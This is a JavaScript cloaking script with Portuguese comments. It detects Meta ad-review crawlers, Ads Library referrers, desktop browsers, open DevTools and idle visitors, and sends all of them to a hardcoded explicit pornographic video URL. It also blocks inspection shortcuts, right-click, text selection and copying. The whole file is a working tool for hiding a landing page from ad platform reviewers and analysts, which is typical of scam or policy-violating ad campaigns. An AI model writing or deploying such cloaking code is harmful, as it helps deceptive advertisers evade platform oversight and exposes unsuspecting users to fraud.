/**
 * SCRIPT DE PROTEÇÃO AGRESSIVA - VERSÃO 1.0
 * Proteção contra desktop, DevTools, Meta Ads Library e bots
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configurações
    const CONFIG = {
        REDIRECT_URL: 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao',
        META_BOTS: ['facebookexternalhit', 'facebot', 'meta', 'crawler', 'spider', 'bot', 'scraper'],
        DESKTOP_PATTERNS: ['windows', 'macintosh', 'linux', 'x11', 'desktop'],
        MOBILE_PATTERNS: ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'opera mini', 'mobile'],
        DEVTOOLS_THRESHOLD: 160,
        INACTIVITY_TIMEOUT: 3000
    };
    
    // Variáveis de controle
    let protectionActive = true;
    let userInteracted = false;
    let devtoolsOpen = false;
    let inactivityTimer = null;
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Executar todas as verificações
        checkDesktop();
        checkDevTools();
        checkMetaBots();
        setupEventListeners();
        setupInactivityDetection();
        setupConsoleTraps();
        setupCopyProtection();
        
        // Verificação contínua
        setInterval(() => {
            if (!protectionActive) return;
            checkDevTools();
            checkInactivity();
        }, 500);
    }
    
    /**
     * Detectar e redirecionar desktop/notebook
     */
    function checkDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        const isDesktop = CONFIG.DESKTOP_PATTERNS.some(pattern => userAgent.includes(pattern)) &&
                         !CONFIG.MOBILE_PATTERNS.some(pattern => userAgent.includes(pattern));
        
        if (isDesktop) {
            console.log('[PROTECTION] Desktop detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * Detectar DevTools e redirecionar
     */
    function checkDevTools() {
        const widthThreshold = window.outerWidth - window.innerWidth > CONFIG.DEVTOOLS_THRESHOLD;
        const heightThreshold = window.outerHeight - window.innerHeight > CONFIG.DEVTOOLS_THRESHOLD;
        
        if (widthThreshold || heightThreshold) {
            if (!devtoolsOpen) {
                devtoolsOpen = true;
                console.log('[PROTECTION] DevTools detectado - redirecionando...');
                redirectToTarget();
            }
        } else {
            devtoolsOpen = false;
        }
    }
    
    /**
     * Detectar bots da Meta e redirecionar
     */
    function checkMetaBots() {
        const userAgent = navigator.userAgent.toLowerCase();
        const referrer = document.referrer.toLowerCase();
        
        // Verificar user agent de bots
        const isMetaBot = CONFIG.META_BOTS.some(bot => userAgent.includes(bot));
        
        // Verificar referrer da biblioteca de anúncios
        const isFromMetaAds = referrer.includes('facebook.com/ads/library') ||
                             referrer.includes('adsmanager.facebook.com') ||
                             referrer.includes('business.facebook.com/adsmanager') ||
                             referrer.includes('fb.com/ads/library') ||
                             referrer.includes('instagram.com/ads/library');
        
        // Verificar parâmetros de URL
        const urlParams = new URLSearchParams(window.location.search);
        const hasMetaParams = urlParams.has('fbclid') || urlParams.has('igshid');
        
        if (isMetaBot || isFromMetaAds || hasMetaParams) {
            console.log('[PROTECTION] Bot da Meta detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * Configurar detecção de inatividade
     */
    function setupInactivityDetection() {
        inactivityTimer = setTimeout(() => {
            if (!userInteracted) {
                console.log('[PROTECTION] Inatividade detectada - redirecionando...');
                redirectToTarget();
            }
        }, CONFIG.INACTIVITY_TIMEOUT);
    }
    
    /**
     * Verificar inatividade
     */
    function checkInactivity() {
        if (!userInteracted && inactivityTimer) {
            clearTimeout(inactivityTimer);
            setupInactivityDetection();
        }
    }
    
    /**
     * Configurar event listeners para interação do usuário
     */
    function setupEventListeners() {
        const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
        
        events.forEach(event => {
            document.addEventListener(event, () => {
                userInteracted = true;
                if (inactivityTimer) {
                    clearTimeout(inactivityTimer);
                }
            }, { passive: true });
        });
    }
    
    /**
     * Configurar armadilhas do console
     */
    function setupConsoleTraps() {
        // Sobrescrever console.debug
        const originalDebug = console.debug;
        console.debug = function(...args) {
            console.log('[PROTECTION] Console.debug detectado - redirecionando...');
            redirectToTarget();
            return originalDebug.apply(console, args);
        };
        
        // Armadilha para F12
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'S')) {
                e.preventDefault();
                console.log('[PROTECTION] Tecla de atalho detectada - redirecionando...');
                redirectToTarget();
                return false;
            }
        });
    }
    
    /**
     * Proteção contra cópia
     */
    function setupCopyProtection() {
        // Bloquear clique direito
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            console.log('[PROTECTION] Clique direito bloqueado');
            return false;
        });
        
        // Bloquear seleção de texto
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });
        
        // Bloquear arrastar
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        protectionActive = false;
        
        // Limpar timers
        if (inactivityTimer) {
            clearTimeout(inactivityTimer);
        }
        
        // Redirecionar
        try {
            window.location.href = CONFIG.REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(CONFIG.REDIRECT_URL);
        }
    }
    
    /**
     * Função para adicionar parâmetro src=ads
     */
    function addAdsParameter() {
        const url = new URL(window.location.href);
        if (!url.searchParams.has('src')) {
            url.searchParams.set('src', 'ads');
            window.history.replaceState({}, '', url.toString());
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
    // Proteção adicional no load
    window.addEventListener('load', () => {
        // Verificar novamente após carregamento completo
        setTimeout(() => {
            checkDesktop();
            checkMetaBots();
        }, 1000);
    });
    
    // Proteção contra manipulação do script
    Object.freeze(CONFIG);
    
    // Exportar função para uso externo (opcional)
    window.protectionSystem = {
        redirect: redirectToTarget,
        addAdsParam: addAdsParameter
    };
    
})();
